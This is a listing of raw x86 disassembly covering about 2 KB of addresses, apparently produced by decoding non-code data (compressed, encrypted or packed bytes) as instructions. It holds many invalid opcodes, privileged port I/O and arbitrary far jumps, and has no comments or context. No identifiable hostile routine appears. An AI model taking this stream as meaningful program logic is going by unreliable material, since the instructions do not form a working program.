  4146cd:	lds    esp,FWORD PTR [ebx]
  4146cf:	ds stos DWORD PTR es:[edi],eax
  4146d1:	pop    ebx
  4146d2:	pop    esi
  4146d3:	sbb    ecx,DWORD PTR [edi-0x5b]
  4146d6:	test   DWORD PTR [esi-0x6f],ebx
  4146d9:	sbb    ah,cl
  4146db:	sbb    DWORD PTR ds:0xab803151,ecx
  4146e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e2:	jp     0x414721
  4146e4:	pop    ebx
  4146e5:	lds    edx,FWORD PTR ds:0xc3fe2daf
  4146eb:	lods   al,BYTE PTR ds:[esi]
  4146ec:	pop    ds
  4146ed:	adc    eax,esp
  4146ef:	jae    0x4146c9
  4146f1:	or     ecx,0xf7f07bfa
  4146f7:	push   es
  4146f8:	xchg   ebp,eax
  4146f9:	jb     0x414708
  4146fb:	(bad)  
  4146fd:	pop    edx
  4146fe:	pop    edx
  4146ff:	fcomi  st,st(2)
  414701:	fyl2xp1 
  414703:	retf   
  414704:	and    eax,0x7dd22ff0
  414709:	retf   0xccdb
  41470c:	shr    BYTE PTR [esi+0x285d52c1],cl
  414712:	xlat   BYTE PTR ds:[ebx]
  414713:	ds cmp al,0xc3
  414716:	ja     0x41473d
  414718:	cli    
  414719:	push   ds
  41471a:	pop    edx
  41471b:	outs   dx,DWORD PTR ds:[esi]
  41471c:	mov    al,ds:0x8a8e2935
  414721:	add    esp,edx
  414723:	inc    ebp
  414724:	push   0x30406c84
  414729:	xchg   BYTE PTR [esi-0x3d],ah
  41472c:	jbe    0x4146f6
  41472e:	add    dl,BYTE PTR [edx+0x7b]
  414731:	dec    eax
  414732:	popa   
  414733:	iret   
  414734:	nop
  414735:	cmp    eax,0x3737bc50
  41473a:	jae    0x4146c0
  41473c:	pop    ebp
  41473d:	adc    eax,0x45e1da3d
  414742:	mov    ?,WORD PTR ds:0xe2113b45
  414748:	sbb    eax,0x55b699fd
  41474d:	jge    0x41474b
  41474f:	not    BYTE PTR [ecx+0x4d]
  414752:	push   eax
  414753:	xchg   ebx,eax
  414754:	mov    dh,0x8c
  414756:	out    dx,eax
  414757:	retf   0xdbce
  41475a:	jle    0x4147c1
  41475c:	loope  0x4147a7
  41475e:	std    
  41475f:	adc    DWORD PTR [edx],ecx
  414761:	mov    DWORD PTR [ebx+ebx*1+0x5fae83dc],edi
  414768:	cmc    
  414769:	retf   0xedae
  41476c:	mov    ds:0x7ffe7ac3,eax
  414771:	pop    ebx
  414772:	adc    esp,DWORD PTR [ecx+0x7a]
  414775:	clc    
  414776:	out    0x54,al
  414778:	or     eax,0x6af9ca37
  41477d:	js     0x4147de
  41477f:	mov    dh,0x9e
  414781:	lock repz jmp 0x414745
  414785:	int    0xdc
  414787:	jnp    0x414719
  414789:	adc    eax,0xd94b1ffd
  41478e:	data16 test al,0xc0
  414791:	xor    esi,DWORD PTR [ebp+0x72]
  414794:	call   0xfe59fe54
  414799:	push   esp
  41479a:	adc    edx,edi
  41479c:	and    ecx,DWORD PTR [edx+eiz*4+0x7b]
  4147a0:	sti    
  4147a1:	lock repnz fstp DWORD PTR [edi+0x179b7725]
  4147a9:	mov    BYTE PTR [ebx+0x5d3c55e8],ch
  4147af:	sbb    BYTE PTR [edx+0x7b],dl
  4147b2:	test   BYTE PTR [ecx+0x51],bl
  4147b5:	mov    al,0x7f
  4147b7:	inc    ecx
  4147b8:	pop    es
  4147b9:	repnz popa 
  4147bb:	add    edx,DWORD PTR [edx-0x200f73c2]
  4147c1:	outs   dx,DWORD PTR ds:[esi]
  4147c2:	std    
  4147c3:	popa   
  4147c4:	push   ss
  4147c5:	fadd   DWORD PTR [eax-0x43]
  4147c8:	jno    0x414762
  4147ca:	popa   
  4147cb:	call   DWORD PTR [ecx]
  4147cd:	jge    0x4147d8
  4147cf:	cmp    cl,dh
  4147d1:	push   esi
  4147d2:	sti    
  4147d3:	push   ds
  4147d4:	enter  0xde3c,0x83
  4147d8:	dec    ecx
  4147d9:	sar    DWORD PTR [esi+0x53826786],0x5b
  4147e0:	dec    edx
  4147e1:	push   ecx
  4147e2:	lahf   
  4147e3:	add    eax,0x5ae46332
  4147e8:	jp     0x414791
  4147ea:	xlat   BYTE PTR ds:[ebx]
  4147eb:	test   DWORD PTR [ecx+eax*2+0x74],edi
  4147ef:	je     0x414772
  4147f1:	dec    ebp
  4147f2:	out    0xb1,eax
  4147f4:	add    ebx,edx
  4147f6:	jmp    0x6e1d:0x17794969
  4147fd:	gs test eax,eax
  414800:	sbb    DWORD PTR [ecx],edx
  414802:	push   0xffffff87
  414804:	daa    
  414805:	lods   al,BYTE PTR ds:[esi]
  414806:	sahf   
  414807:	or     bl,0xea
  41480a:	sub    eax,0x7fc69dce
  41480f:	mov    al,0x92
  414811:	pop    ebx
  414812:	jle    0x414810
  414814:	retf   
  414815:	outs   dx,BYTE PTR ds:[esi]
  414816:	mov    cl,0x96
  414818:	jae    0x41481b
  41481a:	jmp    0xd98b7190
  41481f:	xchg   ecx,eax
  414820:	and    eax,0x5da955cb
  414825:	shl    BYTE PTR [eax+eiz*2-0x76],cl
  414829:	sbb    dh,BYTE PTR [esi+0x64]
  41482c:	(bad)  
  41482d:	inc    DWORD PTR [ecx]
  41482f:	test   eax,0x6a241fc
  414834:	std    
  414835:	dec    edx
  414836:	cmp    eax,0x6f139321
  41483b:	ficom  WORD PTR [esi]
  41483d:	pusha  
  41483e:	dec    ecx
  41483f:	inc    esp
  414840:	repnz pushf 
  414842:	or     BYTE PTR [ecx+0x1c],cl
  414845:	gs clc 
  414847:	sbb    al,0xdc
  414849:	aas    
  41484a:	jl     0x4147ee
  41484c:	repz shr DWORD PTR [eax],0x59
  414850:	stos   DWORD PTR es:[edi],eax
  414851:	lods   al,BYTE PTR ds:[esi]
  414852:	fiadd  DWORD PTR cs:[edi+0x3975fb73]
  414859:	or     eax,0xe0398ebc
  41485e:	xchg   ecx,eax
  41485f:	or     ecx,0xffffff84
  414862:	stos   DWORD PTR es:[edi],eax
  414863:	add    eax,esi
  414865:	xchg   ebp,eax
  414866:	mov    ds:0xffe429de,al
  41486b:	aam    0x94
  41486d:	inc    ecx
  41486e:	dec    BYTE PTR [eax+eax*8+0x19ce932e]
  414875:	in     eax,dx
  414876:	std    
  414877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414878:	hlt    
  414879:	push   es
  41487a:	cwde   
  41487b:	jns    0x414841
  41487d:	pop    ebx
  41487e:	add    DWORD PTR [ebp+0x46614a4e],0x7ffcde9c
  414888:	mov    ah,0x87
  41488a:	push   0x2b
  41488c:	test   DWORD PTR cs:[ebp+ebx*8+0x60],ecx
  414891:	dec    esi
  414892:	cdq    
  414893:	xor    ebp,DWORD PTR [ebp+0x658745ed]
  414899:	loopne 0x41490f
  41489b:	test   BYTE PTR ds:0x7fb76be1,bh
  4148a1:	jmpw   0xd771
  4148a5:	aas    
  4148a6:	xor    al,0x18
  4148a8:	dec    esp
  4148a9:	inc    esi
  4148aa:	pop    edx
  4148ab:	jbe    0x41483f
  4148ad:	(bad)  
  4148ae:	test   DWORD PTR [ebp+eax*4+0xdda00ef],0xf25f5160
  4148b9:	les    esp,FWORD PTR [edx]
  4148bb:	xor    DWORD PTR [ecx],0x81e62c22
  4148c1:	fisub  WORD PTR [edx+0x44]
  4148c4:	cld    
  4148c5:	xchg   ebp,eax
  4148c6:	xchg   ecx,eax
  4148c7:	retf   0xecc2
  4148ca:	or     edx,DWORD PTR [ecx+0x517ee07b]
  4148d0:	outs   dx,DWORD PTR ds:[esi]
  4148d1:	xchg   esp,eax
  4148d2:	rcl    ah,cl
  4148d4:	std    
  4148d5:	fld    DWORD PTR [edi]
  4148d7:	jne    0x4148a5
  4148d9:	mov    esp,edi
  4148db:	fsubr  DWORD PTR [ecx-0x66]
  4148de:	cld    
  4148df:	pop    ds
  4148e0:	out    dx,eax
  4148e1:	shl    BYTE PTR [esi-0x2999ceee],1
  4148e7:	push   es
  4148e8:	mov    edi,0xffb4399d
  4148ed:	or     eax,0x351b99f3
  4148f2:	xor    eax,0x3f6ec310
  4148f7:	jne    0x4148a7
  4148f9:	cmp    eax,0x29e27e0a
  4148fe:	repz cmc 
  414900:	mov    bh,0x7
  414902:	pop    ds
  414903:	jns    0x414893
  414905:	mov    bh,0x0
  414907:	dec    edx
  414908:	cmc    
  414909:	dec    eax
  41490a:	push   ebp
  41490b:	mov    ch,0xde
  41490d:	push   edx
  41490e:	scas   al,BYTE PTR es:[edi]
  41490f:	xchg   DWORD PTR [ebp+0xd],ebp
  414912:	jge    0x414962
  414914:	and    BYTE PTR [esi],cl
  414916:	lds    esp,FWORD PTR [edi+ebp*1-0x4c007239]
  41491d:	lods   eax,DWORD PTR ds:[esi]
  41491e:	push   0x414fc9d3
  414923:	push   esi
  414924:	and    eax,0x2fe2dcfb
  414929:	bound  ecx,QWORD PTR [edi+0x4ed76a8d]
  41492f:	and    al,0x73
  414931:	shl    BYTE PTR [ecx+0x36],1
  414934:	loop   0x41496d
  414936:	mov    ebp,0xc62bd6e0
  41493b:	test   eax,0xabf065a2
  414940:	out    0x34,eax
  414942:	push   ss
  414943:	or     al,0xcd
  414945:	jg     0x41492d
  414947:	retf   
  414948:	fld    st(0)
  41494a:	imul   esp,DWORD PTR [ecx-0x5c195860],0x4437f353
  414954:	dec    ebp
  414955:	data16 loopne 0x4148eb
  414958:	pop    eax
  414959:	and    al,0xe1
  41495b:	mov    dh,0xff
  41495d:	jp     0x41498d
  41495f:	push   esi
  414960:	adc    bl,bl
  414962:	js     0x4149b5
  414964:	add    BYTE PTR [ebx],dh
  414966:	(bad)  
  414967:	stos   DWORD PTR es:[edi],eax
  414968:	nop
  414969:	shr    DWORD PTR [edx],1
  41496b:	ret    0xa1ce
  41496e:	loop   0x41494c
  414970:	add    eax,0x5b5358a7
  414975:	cs or  al,0x71
  414978:	jg     0x414938
  41497a:	jmp    0xbb3c:0x8e8b278a
  414981:	rol    bh,0x63
  414984:	fdiv   QWORD PTR [ebx-0x6ecd6498]
  41498a:	ss stos BYTE PTR es:[edi],al
  41498c:	push   0x3f3c217
  414991:	cli    
  414992:	or     al,BYTE PTR [esi+0x1f]
  414995:	out    dx,eax
  414996:	pop    ecx
  414997:	xchg   edx,eax
  414998:	rol    ah,1
  41499a:	sub    BYTE PTR [esi],dh
  41499c:	(bad)  
  41499d:	out    dx,eax
  41499e:	fs scas eax,DWORD PTR es:[edi]
  4149a0:	jno    0x41492e
  4149a2:	leave  
  4149a3:	dec    eax
  4149a4:	imul   edi,DWORD PTR [eax+edi*8+0x5c28fab4],0x57
  4149ac:	fimul  WORD PTR [esi+edx*1]
  4149af:	daa    
  4149b0:	loope  0x414972
  4149b2:	or     al,0x7e
  4149b4:	mov    bh,0xdb
  4149b6:	xchg   ecx,eax
  4149b7:	int    0xa5
  4149b9:	mov    al,0xd4
  4149bb:	sar    DWORD PTR [esi+0x67],0xf5
  4149bf:	jge    0x41499e
  4149c1:	popf   
  4149c2:	pop    ds
  4149c3:	push   ebp
  4149c4:	cli    
  4149c5:	sub    eax,0xb42d66b7
  4149ca:	cwde   
  4149cb:	aam    0xd4
  4149cd:	add    ecx,esi
  4149cf:	repnz mov ecx,0x36c8eaed
  4149d5:	xor    BYTE PTR [edi],0x1b
  4149d8:	or     eax,0x87d13b77
  4149dd:	adc    ebx,DWORD PTR [esi-0x75b8f192]
  4149e3:	cwde   
  4149e4:	scas   eax,DWORD PTR es:[edi]
  4149e5:	int    0x4b
  4149e7:	(bad)  
  4149e8:	jmp    0x414a54
  4149ea:	push   edi
  4149eb:	es stos DWORD PTR es:[edi],eax
  4149ed:	xor    BYTE PTR [ebx+0x1],bh
  4149f0:	mov    esi,DWORD PTR [ecx+0x53b9ec82]
  4149f6:	rcr    BYTE PTR [ebx],1
  4149f8:	in     eax,dx
  4149f9:	dec    ecx
  4149fa:	sahf   
  4149fb:	mov    dh,0x0
  4149fd:	jnp    0x414a3b
  4149ff:	cli    
  414a00:	pushf  
  414a01:	inc    edx
  414a02:	add    ebx,DWORD PTR [ecx+0x56]
  414a05:	sbb    eax,0x8db6bc52
  414a0a:	mov    ds:0xdc0e3055,al
  414a0f:	ins    BYTE PTR es:[edi],dx
  414a10:	lods   eax,DWORD PTR ds:[esi]
  414a11:	les    edi,FWORD PTR [eax]
  414a13:	or     DWORD PTR [eax-0x2cb169b6],0xffffff85
  414a1a:	shl    DWORD PTR [ecx],1
  414a1c:	cmc    
  414a1d:	sub    al,0x41
  414a1f:	mov    ?,WORD PTR [ebx+0x6c905484]
  414a25:	mov    ah,0x8
  414a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a28:	hlt    
  414a29:	push   esp
  414a2a:	cmp    eax,0xa48017a8
  414a2f:	addr16 jl 0x4149dc
  414a32:	xor    eax,DWORD PTR [edx-0x13]
  414a35:	(bad)  
  414a36:	jecxz  0x414a40
  414a38:	mov    cl,dl
  414a3a:	icebp  
  414a3b:	mov    edi,0xc3e30ad3
  414a40:	clc    
  414a41:	cmp    eax,0x12820504
  414a46:	or     bh,BYTE PTR [ebx-0x5b]
  414a49:	mov    eax,ds:0x461fc7eb
  414a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a4f:	cmp    eax,DWORD PTR [ebp-0x3178b47]
  414a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a56:	push   es
  414a57:	bound  esp,QWORD PTR [edx-0x43]
  414a5a:	sbb    esi,DWORD PTR [eax+0x66d93265]
  414a60:	cmc    
  414a61:	xor    dl,BYTE PTR [edi+0x1db0ff41]
  414a67:	jns    0x414a33
  414a69:	xchg   esp,eax
  414a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a6b:	out    dx,eax
  414a6c:	cmp    esi,DWORD PTR [edx]
  414a6e:	xchg   esi,eax
  414a6f:	xor    DWORD PTR [ecx-0x5dbccb4b],edx
  414a75:	arpl   WORD PTR [ecx-0x58dcdb36],bp
  414a7b:	inc    eax
  414a7c:	outs   dx,BYTE PTR ds:[esi]
  414a7d:	ins    BYTE PTR es:[edi],dx
  414a7e:	mov    edi,0x55b1bdfc
  414a83:	push   ds
  414a84:	inc    ebp
  414a85:	pop    ebp
  414a86:	cmp    bh,cl
  414a88:	sahf   
  414a89:	in     al,dx
  414a8a:	or     BYTE PTR [ebp*8+0x4d262e17],cl
  414a91:	cdq    
  414a92:	add    al,0x92
  414a94:	arpl   WORD PTR [ecx],si
  414a96:	pop    esi
  414a97:	mov    edi,0x52c4c370
  414a9c:	add    DWORD PTR [ecx-0x1b3e58aa],ebp
  414aa2:	or     ch,ah
  414aa4:	mov    ebx,0xf189c62d
  414aa9:	or     esp,DWORD PTR [edi+0x8]
  414aac:	add    DWORD PTR [edx],eax
  414aae:	ret    
  414aaf:	xor    DWORD PTR [ebx+0x3e533bf9],ecx
  414ab5:	pop    edi
  414ab6:	and    esi,DWORD PTR [ebx+0x3d4e96b7]
  414abc:	jo     0x414a90
  414abe:	mov    al,BYTE PTR [eax-0x14709188]
  414ac4:	cmp    BYTE PTR [esp+ecx*4+0x1cbac047],ch
  414acb:	inc    edx
  414acc:	jmp    0x414b43
  414ace:	and    BYTE PTR [ebx-0x69],ah
  414ad1:	(bad)  
  414ad2:	test   al,0x5e
  414ad4:	(bad)  
  414ad7:	pop    edi
  414ad8:	inc    ebp
  414ad9:	jnp    0x414aa0
  414adb:	dec    edi
  414adc:	jecxz  0x414aad
  414ade:	or     eax,0x57b87f08
  414ae3:	xchg   ebx,eax
  414ae4:	out    0x4e,al
  414ae6:	enter  0xd88d,0xfb
  414aea:	int    0xc3
  414aec:	iret   
  414aed:	mov    cl,bl
  414aef:	rol    BYTE PTR [ecx],cl
  414af1:	int3   
  414af2:	fisub  WORD PTR [esi+ebx*4]
  414af5:	inc    esp
  414af6:	push   ebx
  414af7:	cmp    dh,0xb9
  414afa:	scas   eax,DWORD PTR es:[edi]
  414afb:	jb     0x414a9a
  414afd:	rcl    DWORD PTR ds:0xe36644ba,1
  414b03:	or     bl,BYTE PTR [esi]
  414b05:	dec    esi
  414b06:	inc    edi
  414b07:	pop    ebx
  414b08:	push   ds
  414b09:	rcl    DWORD PTR ds:0x33377083,0xd0
  414b10:	xchg   DWORD PTR [eax-0x3dbcf678],esp
  414b16:	push   esi
  414b17:	int3   
  414b18:	pop    es
  414b19:	(bad)  
  414b1a:	mov    bh,BYTE PTR [eax]
  414b1c:	dec    edx
  414b1d:	push   eax
  414b1e:	pop    edi
  414b1f:	mov    ch,BYTE PTR [edx]
  414b21:	iret   
  414b22:	imul   esi,DWORD PTR [edx],0x778bdd46
  414b28:	dec    esp
  414b29:	dec    ebx
  414b2a:	sbb    DWORD PTR [edi],edi
  414b2c:	or     ah,BYTE PTR [ebx]
  414b2e:	sub    bl,BYTE PTR [ecx]
  414b30:	repz mov eax,ds:0x965773ba
  414b36:	xchg   ecx,eax
  414b37:	shl    DWORD PTR [edx],cl
  414b39:	pop    ebp
  414b3a:	mov    ds:0x38778fed,al
  414b3f:	call   0x6814d0dd
  414b44:	dec    ecx
  414b45:	sar    DWORD PTR [esi-0x1b6481f4],0x8a
  414b4c:	adc    bl,BYTE PTR [esi-0x5a]
  414b4f:	out    0x89,eax
  414b51:	mov    DWORD PTR [ebx],edx
  414b53:	sub    DWORD PTR [edx-0xd3d64f9],ecx
  414b59:	test   BYTE PTR [edx],bl
  414b5b:	in     al,dx
  414b5c:	mov    eax,ds:0xcba2dc89
  414b61:	pusha  
  414b62:	add    bh,BYTE PTR [edx-0x2c3d9b3f]
  414b68:	call   0x9814986a
  414b6d:	jbe    0x414b95
  414b6f:	ror    BYTE PTR [esi],0xd8
  414b72:	scas   eax,DWORD PTR es:[edi]
  414b73:	pop    ecx
  414b74:	fidivr DWORD PTR [bp+si-0x15]
  414b78:	lahf   
  414b79:	call   0x77c7:0xe229d715
  414b80:	adc    DWORD PTR [ebp+0x74],edi
  414b83:	pusha  
  414b84:	mov    edx,0x8b28dd76
  414b89:	in     eax,0x4e
  414b8b:	out    0x7f,al
  414b8d:	das    
  414b8e:	push   esp
  414b8f:	pusha  
  414b90:	dec    ebp
  414b91:	ss inc esp
  414b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b94:	inc    ecx
  414b95:	sbb    BYTE PTR [ecx-0x27],al
  414b98:	cld    
  414b99:	test   al,0x57
  414b9b:	push   0xe0277b87
  414ba0:	jno    0x414bfb
  414ba2:	pop    esi
  414ba3:	jg     0x414b41
  414ba5:	ret    
  414ba6:	xchg   edi,eax
  414ba7:	dec    edi
  414ba8:	lods   al,BYTE PTR ds:[esi]
  414ba9:	pop    esi
  414baa:	mov    ah,0xfe
  414bac:	cmc    
  414bad:	enter  0xcd5e,0x6b
  414bb1:	nop
  414bb2:	popf   
  414bb3:	les    ecx,FWORD PTR [edx]
  414bb5:	jo     0x414bfe
  414bb7:	lock or esp,DWORD PTR [ebp-0x51]
  414bbb:	xchg   esp,eax
  414bbc:	adc    edi,ecx
  414bbe:	imul   DWORD PTR [edx]
  414bc0:	pop    edi
  414bc1:	int3   
  414bc2:	aad    0xa9
  414bc4:	jbe    0x414b7b
  414bc6:	stc    
  414bc7:	retf   0x98d
  414bca:	jmp    0x3ac1bf9
  414bcf:	dec    eax
  414bd0:	push   edx
  414bd1:	sub    eax,0xf4ed5cbc
  414bd6:	sub    ah,0xea
  414bd9:	repnz stos BYTE PTR es:[edi],al
  414bdb:	in     al,dx
  414bdc:	aas    
  414bdd:	out    0x57,eax
  414bdf:	fdivr  DWORD PTR [ecx+0x5c]
  414be2:	add    DWORD PTR [esi],esi
  414be4:	shl    DWORD PTR [edi],0x2f
  414be7:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  414be9:	stos   BYTE PTR es:[edi],al
  414bea:	inc    esi
  414beb:	mov    ss,WORD PTR [edx]
  414bed:	(bad)  
  414bee:	hlt    
  414bef:	or     eax,0x619f6d05
  414bf4:	pop    esp
  414bf5:	mov    ebp,0xe850d067
  414bfa:	or     eax,0x8af1dc61
  414bff:	into   
  414c00:	mov    ebp,0x3411117f
  414c05:	loop   0x414c01
  414c07:	popf   
  414c08:	outs   dx,BYTE PTR ds:[esi]
  414c09:	jmp    0xcfed:0x2783b7ce
  414c10:	bound  edx,QWORD PTR [eax-0x6576b69d]
  414c16:	pop    eax
  414c17:	popa   
  414c18:	push   esi
  414c19:	xchg   BYTE PTR [edi+0xd],bh
  414c1c:	(bad)  
  414c1d:	imul   edx,DWORD PTR [ebx],0x349ffba
  414c23:	scas   eax,DWORD PTR es:[edi]
  414c24:	mov    dh,0x91
  414c26:	lock (bad) 
  414c28:	adc    DWORD PTR [ebx],ebp
  414c2a:	stc    
  414c2b:	sub    DWORD PTR [edi+eiz*1+0x66bdefd],0x15
  414c33:	and    BYTE PTR [edx-0x754f65c3],dl
  414c39:	and    eax,DWORD PTR [edx-0x54757a01]
  414c3f:	loopne 0x414c54
  414c41:	fild   QWORD PTR [esi-0x35]
  414c44:	aad    0x3b
  414c46:	mov    bl,0x16
  414c48:	jns    0x414c3d
  414c4a:	shl    DWORD PTR [ebx],cl
  414c4c:	cmc    
  414c4d:	call   0x124f53ec
  414c52:	aam    0x3a
  414c54:	adc    eax,DWORD PTR [eax+0x5c]
  414c57:	sub    esi,esi
  414c59:	xchg   DWORD PTR [edx],edi
  414c5b:	mov    ch,0x67
  414c5d:	xchg   BYTE PTR ds:0x6c0b42b9,ch
  414c63:	inc    ecx
  414c64:	loop   0x414c4d
  414c66:	dec    edx
  414c67:	mov    ebx,0x8d5cc99b
  414c6c:	cmp    dl,BYTE PTR [esi-0x2a30f049]
  414c72:	pop    edx
  414c73:	jecxz  0x414c28
  414c75:	xor    cl,BYTE PTR [esi-0x2]
  414c78:	jae    0x414c61
  414c7a:	sbb    DWORD PTR gs:0x144b7c10,edi
  414c81:	cmovnp ecx,DWORD PTR ds:0xd1aac0ef
  414c88:	popf   
  414c89:	sahf   
  414c8a:	jge    0xfaaa4803
  414c90:	add    bl,BYTE PTR [esp+ebx*4+0x2b]
  414c94:	mov    ecx,0xd4e97901
  414c99:	loope  0x414c69
  414c9b:	sti    
  414c9c:	stc    
  414c9d:	das    
  414c9e:	push   esp
  414c9f:	fcomp  QWORD PTR [edx]
  414ca1:	addr16 das 
  414ca3:	outs   dx,DWORD PTR ds:[esi]
  414ca4:	test   eax,0xf69023d8
  414ca9:	bound  esi,QWORD PTR [edx+0x3e]
  414cac:	jl     0x414c2f
  414cae:	adc    al,0x70
  414cb0:	rcl    DWORD PTR [esp+ebx*1-0x86352b1],cl
  414cb7:	retf   
  414cb8:	repnz lea esi,ds:0xc2127b5d
  414cbf:	ds aad 0x68
  414cc2:	jns    0x414d37
  414cc4:	pop    esp
  414cc5:	test   esi,eax
  414cc7:	adc    ebp,DWORD PTR [ecx+0x62]
  414cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ccb:	mov    al,ds:0xea4b4c34
  414cd0:	xchg   DWORD PTR [ebx],ebp
  414cd2:	test   eax,0x8b81ae2d
  414cd7:	shl    al,1
  414cd9:	and    al,cl
  414cdb:	jge    0x414ca9
  414cdd:	add    ecx,DWORD PTR [eax+0x2c]
  414ce0:	jae    0x414d5f
  414ce2:	idiv   BYTE PTR ds:0x87fb0e80
  414ce8:	inc    ebx
  414ce9:	and    DWORD PTR [esi],edi
  414ceb:	push   0xc
  414ced:	(bad)  
  414cee:	(bad)  
  414cef:	test   BYTE PTR [ebx+eax*2+0x5b],0x19
  414cf4:	mov    eax,0x2abf6e8e
  414cf9:	sahf   
  414cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cfb:	mov    dl,0x32
  414cfd:	dec    esp
  414cfe:	sub    dh,dl
  414d00:	pop    eax
  414d01:	pop    esp
  414d02:	ror    DWORD PTR [esi+eiz*4],1
  414d05:	ds dec edx
  414d07:	sbb    esi,eax
  414d09:	cmc    
  414d0a:	add    BYTE PTR [ecx],ah
  414d0c:	mov    ds:0x5b982616,al
  414d11:	push   esp
  414d12:	pop    ss
  414d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d14:	sbb    edx,esp
  414d16:	or     dl,BYTE PTR [eax]
  414d18:	arpl   WORD PTR [ebp+0x2b],ax
  414d1b:	shl    DWORD PTR [edi-0x29],cl
  414d1e:	mov    eax,ds:0xa0b4ea95
  414d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d24:	inc    ebp
  414d25:	mov    ecx,0xda3c9833
  414d2a:	jecxz  0x414d6f
  414d2c:	or     cl,al
  414d2e:	mov    BYTE PTR [esi-0x127f6919],bh
  414d34:	pop    ebx
  414d35:	idiv   DWORD PTR [esi+eiz*8]
  414d38:	div    DWORD PTR [ecx+0x5f267bec]
  414d3e:	jmp    0x83e06cf5
  414d43:	mov    al,ds:0xe92ff7a7
  414d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d49:	(bad)  
  414d4a:	lods   eax,DWORD PTR ds:[esi]
  414d4b:	repz mov ds:0x96f16288,eax
  414d51:	shr    ch,1
  414d53:	in     eax,dx
  414d54:	jp     0x414d32
  414d56:	cmp    edx,DWORD PTR ds:0x20aa5f92
  414d5c:	retf   0xcbef
  414d5f:	test   DWORD PTR ss:[ebx],ebp
  414d62:	sbb    esp,edi
  414d64:	mov    esp,0x4cb36089
  414d69:	and    al,0xe3
  414d6b:	mov    cl,0x62
  414d6d:	(bad)  
  414d6e:	fcmovnu st,st(4)
  414d70:	push   es
  414d71:	je     0x414d35
  414d73:	or     al,0x51
  414d75:	mov    ds:0x48003364,al
  414d7a:	jmp    0xe92c61a5
  414d7f:	ret    0x508f
  414d82:	iret   
  414d83:	(bad)  
  414d84:	cli    
  414d85:	test   al,0x6d
  414d87:	jg     0x414dc1
  414d89:	pusha  
  414d8a:	(bad)  
  414d8c:	loope  0x414d4e
  414d8e:	std    
  414d8f:	push   eax
  414d90:	and    edi,DWORD PTR [ebx+edx*2-0x37f5fddb]
  414d97:	xchg   DWORD PTR [eax],edi
  414d99:	fdivrp st(2),st
  414d9b:	jl     0x414db0
  414d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d9e:	inc    eax
  414d9f:	inc    edx
  414da0:	xchg   ebx,eax
  414da1:	push   esp
  414da2:	(bad)  
  414da3:	xor    BYTE PTR [ecx+0x721e03c0],cl
  414da9:	into   
  414daa:	and    bh,BYTE PTR [ebp+0x12]
  414dad:	inc    eax
  414dae:	jno    0x414da6
  414db0:	jb     0x414d86
  414db2:	adc    cl,dh
  414db4:	push   ss
  414db5:	pop    edi
  414db6:	push   cs
  414db7:	push   DWORD PTR [ebx+0x55448bb9]
  414dbd:	pop    edx
  414dbe:	jbe    0x414de2
  414dc0:	fadd   DWORD PTR [eax-0x558b1acf]
  414dc6:	popa   
  414dc7:	idiv   BYTE PTR [edi-0x1]
  414dca:	lds    edi,FWORD PTR [edi+0x6c9c6e30]
  414dd0:	mov    cl,0x31
  414dd2:	lock fwait
  414dd4:	pusha  
  414dd5:	cmc    
  414dd6:	dec    ecx
  414dd7:	or     ecx,esp
  414dd9:	rcr    ah,1
  414ddb:	xchg   ebx,eax
  414ddc:	mov    ebp,0x453cc980
  414de1:	add    BYTE PTR [edx+0x7e],0xb2
  414de5:	out    dx,eax
  414de6:	jnp    0x414dc1
  414de8:	rol    DWORD PTR [edx],0xf7
  414deb:	pushf  
  414dec:	cwde   
  414ded:	jb     0x414e3a
  414def:	push   ebp
  414df0:	(bad)  [esi-0x37f65fad]
  414df6:	scas   al,BYTE PTR es:[edi]
  414df7:	sub    BYTE PTR [ebp+esi*2+0x11],ch
  414dfb:	add    al,0xcb
  414dfd:	sbb    DWORD PTR [edx],ecx
  414dff:	in     al,dx
  414e00:	add    edx,esi
  414e02:	lahf   
  414e03:	(bad)  
  414e04:	push   0xbbff9238
  414e09:	jmp    0x51c84d9c
  414e0e:	jecxz  0x414e8d
  414e10:	dec    BYTE PTR [edx-0x7d]
  414e13:	add    edx,edx
  414e15:	test   BYTE PTR [edi-0x68],bl
  414e18:	je     0x414dd3
  414e1a:	mov    ebp,0x5567032d
  414e1f:	mov    al,ds:0xd451ce4d
  414e24:	iret   
  414e25:	(bad)  
  414e26:	push   ss
  414e27:	push   es
  414e28:	mov    bh,BYTE PTR [ebx]
  414e2a:	mov    ecx,0xc2fa8a16
  414e2f:	jecxz  0x414db6
  414e31:	out    dx,al
  414e32:	adc    esi,DWORD PTR [ebp+0x28456e79]
  414e38:	and    al,0xf2
  414e3a:	and    BYTE PTR [edx-0x8],0x3e
  414e3e:	dec    edx
  414e3f:	mov    eax,0x43056632
  414e44:	and    ch,BYTE PTR [esi]
  414e46:	out    0x3d,al
  414e48:	jge    0x414ec8
  414e4a:	hlt    
  414e4b:	fs or  bh,ah
  414e4e:	xchg   ebx,eax
  414e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e50:	push   esp
  414e51:	aaa    
  414e52:	inc    ebp
  414e53:	mov    bh,0xa0
  414e55:	lock push ds
  414e57:	sbb    al,0x38
  414e59:	cli    
  414e5a:	xor    DWORD PTR [ebp+0x68db02a3],eax
  414e60:	into   
  414e61:	add    ebp,DWORD PTR [edx+ebx*1-0x26199cf2]
  414e68:	push   eax
  414e69:	lock mov ebp,ds
  414e6c:	mov    eax,0x8585fd41
  414e71:	sub    al,0xc0
  414e73:	sub    al,0x4
  414e75:	(bad)  
  414e76:	ds push edi
  414e78:	and    al,0x47
  414e7b:	dec    esp
  414e7c:	scas   al,BYTE PTR es:[edi]
  414e7d:	jbe    0x414e09
